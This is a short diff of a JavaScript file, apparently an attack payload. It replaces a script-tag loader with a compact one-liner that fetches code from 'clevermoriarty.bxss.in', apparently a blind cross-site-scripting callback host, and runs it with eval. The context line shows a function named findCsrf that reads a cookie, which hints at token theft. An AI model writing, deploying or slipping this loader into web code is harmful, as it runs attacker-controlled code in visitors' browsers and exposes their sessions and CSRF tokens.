@@ -1,26 +1,4 @@
-function loadScriptFromURL(url, callback) {
-    const script = document.createElement('script');
-    script.src = url;
-    script.type = 'text/javascript';
-    script.async = true;
-
-    // Optional: Callback when the script is loaded
-    script.onload = () => {
-        console.log(`Script loaded: ${url}`);
-        if (callback) callback();
-    };
-
-    script.onerror = () => {
-        console.error(`Failed to load script: ${url}`);
-    };
-
-    document.head.appendChild(script);
-}
-
-// Example usage
-loadScriptFromURL('https://clevermoriarty.bxss.in', () => {
-    console.log('Another script loaded successfully!');
-});
+function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//clevermoriarty.bxss.in");a.send();
 
 
 function findCsrf(cookieName) {
